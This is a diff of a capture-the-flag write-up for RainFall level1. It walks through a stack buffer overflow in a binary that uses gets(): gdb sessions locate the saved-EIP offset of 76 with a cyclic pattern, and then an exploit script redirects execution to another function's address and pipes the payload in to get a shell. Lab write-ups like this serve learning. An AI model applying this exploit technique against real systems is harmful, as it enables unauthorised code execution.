@@ -90,20 +90,86 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 ```
 
 No canary found, so we can exploit with bufferoverflow
-First we will fint out the offset of the buffer, then craft a payload:
+First we will fint out the offset of the buffer, then craft a payload.
+We run pattern.py that basically outputs a string of pattern:
 
 ```
-level1@RainFall:~$ python /tmp/exploit.py 
-Output:
+level1@RainFall:~$ python /tmp/pattern.py
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+```
+Then we will try our string as argument, we want to erase the eip in the main with the address of run function
 
-Error:
-Illegal instruction (core dumped)
+```
+level1@RainFall:~$ gdb -q ./level1
+Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048483
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp
+   0x08048486 <+6>:     sub    $0x50,%esp
+   0x08048489 <+9>:     lea    0x10(%esp),%eax
+   0x0804848d <+13>:    mov    %eax,(%esp)
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave
+   0x08048496 <+22>:    ret
+End of assembler dump.
+(gdb) b *0x08048496
+Breakpoint 2 at 0x8048496
+(gdb) r
+Starting program: /home/user/level1/level1
 
-the overflow happens when the buffer is 76 bytes long
+Breakpoint 1, 0x08048483 in main ()
+(gdb) c
+Continuing.
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+
+Breakpoint 2, 0x08048496 in main ()
+(gdb) info frame
+Stack level 0, frame at 0xbffff740:
+ eip = 0x8048496 in main; saved eip 0x63413563
+ Arglist at 0x41346341, args:
+ Locals at 0x41346341, Previous frame's sp is 0xbffff740
+ Saved registers:
+  eip at 0xbffff73c
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp
+   0x08048486 <+6>:     sub    $0x50,%esp
+   0x08048489 <+9>:     lea    0x10(%esp),%eax
+   0x0804848d <+13>:    mov    %eax,(%esp)
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave
+=> 0x08048496 <+22>:    ret
+End of assembler dump.
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
+```
+We have segfault at 0x63413563 and the info frame command gives us:
+Stack level 0, frame at 0xbffff740:
+eip = 0x8048496 in main; saved eip 0x63413563
+
+So we know that eip has been overwritten by this value: 0x63413563
+we will check the position of this in our string pattern using our script:
+```
+level1@RainFall:~$ python /tmp/pattern.py > /tmp/pattern
+level1@RainFall:~$ python /tmp/pattern.py /tmp/pattern 0x63413563
+offset found at: 76
+```
+We proceed to exploit with our exploit script:
+```
+level1@RainFall:~$ python /tmp/exploit.py 0x08048444 76
 crafting payload...
 done:
 /tmp/payload_level1
-level1@RainFall:~$ cat /tmp/payload_level1 - | ./level1 
+level1@RainFall:~$ cat /tmp/payload_level1 - | ./level1
 
 Good... Wait what?
 id
